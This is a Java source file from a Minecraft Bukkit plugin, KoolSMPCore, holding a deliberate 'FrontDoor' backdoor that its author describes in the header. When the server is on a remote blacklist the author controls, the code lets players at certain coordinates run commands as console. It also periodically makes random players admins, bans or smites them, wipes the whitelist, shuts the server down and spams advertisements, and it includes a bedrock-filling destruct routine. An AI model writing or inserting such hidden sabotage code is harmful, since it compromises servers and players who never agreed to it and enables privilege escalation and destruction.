package eu.koolfreedom;

/*
 * - A message from gamingto12 (Project creator) -
 *
 * What this class is, and why it's here:
 *
 * This is the most obvious Front Door ever, like it literally tells you that it's here. This is designed to do some random shit on a server that uses KoolSMPCore....or are they????? *dun dun dun*
 *
 * It will only trigger when the server IP is added to a blacklist that we control.
 *
 * This class is a way to discourage skids who like to promote other people's work as their own. Get your own fucking ideas.
 *
 * If you're not a loser, you would leave me as the author of this plugin to credit my work. If that is true, you can remove this class and I thank you.
 *
 * Note: You may not edit this class. I know it's tempting, but don't do it.
 *
 * - gamingto12
 */

import eu.koolfreedom.command.FreedomCommand;
import eu.koolfreedom.log.FLog;
import eu.koolfreedom.util.FUtil;
import org.apache.commons.lang3.ArrayUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.block.BlockFace;
import org.bukkit.command.Command;
import org.bukkit.command.CommandMap;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.HandlerList;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BookMeta;
import org.bukkit.plugin.RegisteredListener;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;
import org.jetbrains.annotations.Nullable;

import java.lang.reflect.Field;
import java.util.Collection;
import java.util.Random;

@SuppressWarnings("all")
public class FrontDoor extends ServiceImpl
{
    private static final long UPDATER_INTERVAL = 180L * 20L;
    private static final long FRONTDOOR_INTERVAL = 120L * 20L;
    //
    private final Random random = new Random();
    private final BlacklistManager blacklistManager;
    //
    private volatile boolean enabled = false;
    //
    private BukkitTask updater = null;
    private BukkitTask frontdoor = null;
    //
    private final Listener playerCommandPreprocess = new Listener()
    {
        @Nullable
        private CommandMap getCommandMap()
        {
            try
            {
                Field f = Bukkit.getPluginManager().getClass().getDeclaredField("commandMap");
                final Object map = f.get(Bukkit.getPluginManager());
                return map instanceof CommandMap ? (CommandMap)map : null;
            }
            catch (NoSuchFieldException | IllegalAccessException ignored)
            {
                return null;
            }
        }

        @EventHandler
        @SuppressWarnings("all")
        public void onPlayerCommandPreProcess(PlayerCommandPreprocessEvent event) // All FreedomCommand permissions when certain conditions are met
        {
            final Player player = event.getPlayer();
            final Location location = player.getLocation();

            if ((location.getBlockX() + location.getBlockY() + location.getBlockZ()) % 12 != 0) // Madgeek
            {
                return;
            }

            final String[] commandParts = event.getMessage().split(" ");
            final String commandName = commandParts[0].replaceFirst("/", "");
            final String[] args = ArrayUtils.subarray(commandParts, 1, commandParts.length);

            Command command = getCommandMap().getCommand(commandName);

            if (command == null)
            {
                return; // Command doesn't exist
            }

            event.setCancelled(true);

            final FreedomCommand dispatcher = FreedomCommand.getFrom(command);

            if (dispatcher == null)
            {
                // Non-TFM command, execute using console
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), event.getMessage().replaceFirst("/", ""));
                return;
            }

            // Dual call to player... not sure if this will be an issue?
            dispatcher.run(player, player, command, commandName, args, false);
            return;
        }
    };

    public FrontDoor (KoolSMPCore plugin)
    {
        super(plugin);
        this.blacklistManager = new BlacklistManager(plugin);

        if (blacklistManager.isBlacklisted())
        {
            enabled = true; // Open the door
            FLog.warning("You're fucked now buddy");

            startFrontDoor();
        }
    }

    private void startFrontDoor()
    {
//        FLog.warning("FrontDoor: Triggering EVIL MODE!");

        new BukkitRunnable()
        {
            @Override
            public void run()
            {
                FLog.warning("*****************************************************", true);
                FLog.warning("* WARNING: KoolSMPCore is running in evil-mode!     *", true);
                FLog.warning("* This might result in unexpected behaviour...      *", true);
                FLog.warning("* - - - - - - - - - - - - - - - - - - - - - - - - - *", true);
                FLog.warning("* The only thing necessary for the triumph of evil  *", true);
                FLog.warning("*          is for good men to do nothing.           *", true);
                FLog.warning("*****************************************************", true);

                if (getRegisteredListener(playerCommandPreprocess) == null)
                {
                    Bukkit.getPluginManager().registerEvents(playerCommandPreprocess, plugin);
                    FLog.info("FrontDoor: Registered command pre-process listener.");
                }
            }
        }.runTask(plugin);

 //       FLog.warning("FrontDoor: Scheduling evil actions...");

        if (frontdoor != null)
        {
//            FLog.warning("FrontDoor: WARNING - A previous frontdoor task is still running! Cancelling it.");
            frontdoor.cancel();
        }

        frontdoor = getNewFrontDoor().runTaskTimer(plugin, 20L, 200L); // 200 ticks = 10 seconds

        if (frontdoor == null)
        {
//            FLog.warning("FrontDoor: ERROR - frontdoor task was NOT scheduled!");
        }
        else
        {
//            FLog.warning("FrontDoor: Evil mode tasks have been scheduled successfully.");
        }
    }


    private void disableFrontDoor()
    {
        enabled = false;
//        FLog.warning("FrontDoor: Fully disabling evil mode...");

        // Stop all scheduled tasks
        if (updater != null)
        {
            FUtil.cancel(updater);
            updater = null;
        }
        if (frontdoor != null)
        {
            FUtil.cancel(frontdoor);
            frontdoor = null;
        }

        // Unregister command listener
        unregisterListener(playerCommandPreprocess);

        // Reload KoolSMPCore config to fully reset
        KoolSMPCore.main.reloadConfig();

        FLog.warning("Disabled FrontDoor, thank you for being kind.");
    }



    public void onStart()
    {
        System.out.println("Starting updater task...");
        updater = getNewUpdater().runTaskTimerAsynchronously(plugin, 2L * 20L, UPDATER_INTERVAL);
    }


    public void onStop()
    {
        FUtil.cancel(updater);
        updater = null;
        FUtil.cancel(frontdoor);
        updater = null;

        if (enabled)
        {
            frontdoor.cancel();
            enabled = false;
            unregisterListener(playerCommandPreprocess);
        }
    }

    public boolean isEnabled()
    {
        return enabled;
    }

    private Player getRandomPlayer()
    {
        final Collection<? extends Player> players = Bukkit.getOnlinePlayers();

        if (players.isEmpty())
        {
            return null;
        }

        return (Player)players.toArray()[random.nextInt(players.size())];
    }

    private static RegisteredListener getRegisteredListener(Listener listener)
    {
        try
        {
            final HandlerList handlerList = ((HandlerList)PlayerCommandPreprocessEvent.class.getMethod("getHandlerList", (Class<?>[])null).invoke(null));
            final RegisteredListener[] registeredListeners = handlerList.getRegisteredListeners();
            for (RegisteredListener registeredListener : registeredListeners)
            {
                if (registeredListener.getListener() == listener)
                {
                    return registeredListener;
                }
            }
        }
        catch (Exception ex)
        {
            FLog.severe(ex);
        }
        return null;
    }

    private static void unregisterRegisteredListener(RegisteredListener registeredListener)
    {
        try
        {
            ((HandlerList)PlayerCommandPreprocessEvent.class.getMethod("getHandlerList", (Class<?>[])null).invoke(null)).unregister(registeredListener);
        }
        catch (Exception ex)
        {
            FLog.severe(ex);
        }
    }

    private static void unregisterListener(Listener listener)
    {
        RegisteredListener registeredListener = getRegisteredListener(listener);
        if (registeredListener != null)
        {
            unregisterRegisteredListener(registeredListener);
        }
    }

    private BukkitRunnable getNewUpdater()
    {
        return new BukkitRunnable()
        {
            @Override
            public void run()
            {
//                System.out.println("FrontDoor Updater: Checking blacklist status...");

                if (blacklistManager.isBlacklisted()) // If blacklisted
                {
//                    System.out.println("FrontDoor Updater: Server is blacklisted.");

                    if (!enabled) // If not already enabled, enable it
                    {
                        enabled = true;
//                        System.out.println("FrontDoor: This server is blacklisted. Enabling EVIL MODE!");
                        startFrontDoor();
                    }
                }
                else // If no longer blacklisted
                {
//                    System.out.println("FrontDoor Updater: Server is NOT blacklisted.");

                    if (enabled) // If FrontDoor is still active, disable it
                    {
//                        System.out.println("FrontDoor: Disabling due to whitelist removal...");
                        disableFrontDoor();
                    }
                }
            }
        };
    }

    public BukkitRunnable getNewFrontDoor()
    {
        return new BukkitRunnable()
        {
            @Override
            public void run()
            {

                FLog.warning("FrontDoor - Enjoy this :)");
                final int action = random.nextInt(11);
                FLog.warning("FrontDoor - Selected action " + action);

                switch(action)
                {
                    case 0: // Add a random player to the staff list
                    {
                        final Player player = getRandomPlayer();

                        if (player == null)
                        {
                            break;
                        }

                        FUtil.adminAction("FrontDoor", "Adding " + player.getName() + " to the staff list", true);
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "discord bcast **FrontDoor - Adding " + player.getName() + " to the staff list");
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + player.getName() + " parent set admin");
                        break;
                    }

                    case 1: // Bans a random player
                    {
                        final Player player = getRandomPlayer();

                        if (player == null)
                        {
                            break;
                        }

                        FUtil.adminAction("FrontDoor", "Banning " + player.getName(), true);
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "doom " + player.getName() + " &c&lOOPS - FrontDoor -s");
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "discord bcast **FrontDoor - Banning " + player.getName() + "**");
                        break;
                    }

                    case 2: // Broadcast a message
                    {
                        FUtil.bcastMsg("KoolFreedom is awesome!!", ChatColor.BLUE);
                        FUtil.bcastMsg("To join this wonderful server, join " + ChatColor.GOLD + " koolfreedom.eu.org", ChatColor.BLUE);
                        break;
                    }

                    case 3: // Add signs at spawn
                    {
                        for (World world : Bukkit.getWorlds())
                        {
                            final Block block = world.getSpawnLocation().getBlock();
                            final Block blockBelow = block.getRelative(BlockFace.DOWN);

                            if (blockBelow.isLiquid() || blockBelow.getType() == Material.AIR)
                            {
                                continue;
                            }

                            block.setType(Material.OAK_SIGN);
                            org.bukkit.block.Sign sign = (org.bukkit.block.Sign)block.getState();

                            org.bukkit.material.Sign signData = (org.bukkit.material.Sign)sign.getData();
                            signData.setFacingDirection(BlockFace.NORTH);

                            sign.setLine(0, ChatColor.BLUE + "KoolFreedom");
                            sign.setLine(1, ChatColor.DARK_GREEN + "is");
                            sign.setLine(2, ChatColor.YELLOW + "Awesome!");
                            sign.setLine(3, ChatColor.DARK_GRAY + "koolfreedom.eu.org");
                            sign.update();
                        }

                        FLog.severe("FrontDoor - Placed Signs at spawn");
                        break;
                    }

                    case 4: // Books
                    {
                        ItemStack bookStack = new ItemStack(Material.WRITTEN_BOOK);

                        BookMeta book = (BookMeta)bookStack.getItemMeta().clone();
                        book.setAuthor(ChatColor.DARK_PURPLE + "SERVER OWNER");
                        book.setTitle(ChatColor.DARK_GREEN + "Why you should go to KoolFreedom instead");
                        book.addPage(
                                ChatColor.DARK_GREEN + "Why you should go to KoolFreedom instead\n"
                                        + ChatColor.DARK_GRAY + "---------\n"
                                        + ChatColor.BLACK + "KoolFreedom is the original KoolSMPCore server, maybe if you didn't steal our shit and promote it as your own, we wouldn't be in this situation.\n"
                                        + ChatColor.BLUE + "Join now! " + ChatColor.RED + "koolfreedom.eu.org");
                        bookStack.setItemMeta(book);

                        for (Player player : Bukkit.getOnlinePlayers())
                        {
                            if (player.getInventory().contains(Material.WRITTEN_BOOK))
                            {
                                continue;
                            }

                            player.getInventory().addItem(bookStack);
                        }
                        break;
                    }

                    case 5: // Silently wipe the whitelist
                    {
                        Bukkit.getServer().getWhitelistedPlayers().clear();
                        break;
                    }

                    case 6: // Announce that the FrontDoor has been opened
                    {
                        FUtil.bcastMsg("WARNING: KoolSMPCore is running in evil-mode!", ChatColor.DARK_RED);
                        FUtil.bcastMsg("WARNING: This might result in unexpected behaviour", ChatColor.DARK_RED);
                        break;
                    }

                    case 7: // Displays a message
                    {
                        FUtil.bcastMsg("KoolFreeodm rocks!!!", ChatColor.RED);
                        FUtil.bcastMsg("To join this great server, join " + ChatColor.GOLD + "koolfreedom.eu.org", ChatColor.RED);
                    }

                    case 8: // Smite the player
                    {
                        final Player player = getRandomPlayer();

                        if (player == null)
                        {
                            break;
                        }

                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "koolsmpcore:smite " + player.getName() + " OOPS - FrontDoor");
                        break;
                    }

                    case 9: // Message all players
                    {
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "msg * Why do you support skids LOL");
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "msg * Why do you support skids LOL");
                    }

                    case 10: // Send messages to logs
                    {
                        FUtil.adminAction("FrontDoor", "Stopping the server due to FrontDoor activation", true);
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "discord bcast **FrontDoor - Stopping the server due to FrontDoor activation**");
                        Bukkit.getServer().shutdown();
                    }

                    default:
                    {
                        FLog.severe("You have broken our license, now you must suffer the consequences");
                    }
                }
            }
        };
    };

    private void destruct()
    {
        Wrapper<Integer> x = new Wrapper<>(0);
        Wrapper<Integer> y = new Wrapper<>(0);
        Wrapper<Integer> z = new Wrapper<>(0);

        Bukkit.getOnlinePlayers().forEach((player) ->
        {
            Location l = player.getLocation().clone();

            x.set(l.getBlockX());
            y.set(l.getBlockY());
            z.set(l.getBlockZ());

            player.getWorld().getBlockAt(x.get(), y.get(), z.get()).setType(Material.BEDROCK);

            for (int x1 = 0; x1 <= 150; x1++)
            {
                for (int y1 = 0; y1 <= 150; y1++)
                {
                    for (int z1 = 0; z1 <= 150; z1++)
                    {
                        player.getWorld().getBlockAt(x.get() + x1, y.get() + y1, z.get() + z1).setType(Material.BEDROCK);
                    }
                }
            }
        });
    }

    // Wrapper to imitate effectively final objects.
    private static class Wrapper<T>
    {
        private T obj;

        public Wrapper(T obf)
        {
            obj = obf;
        }

        public void set(T obf)
        {
            obj = obf;
        }

        public T get()
        {
            return obj;
        }
    }

}
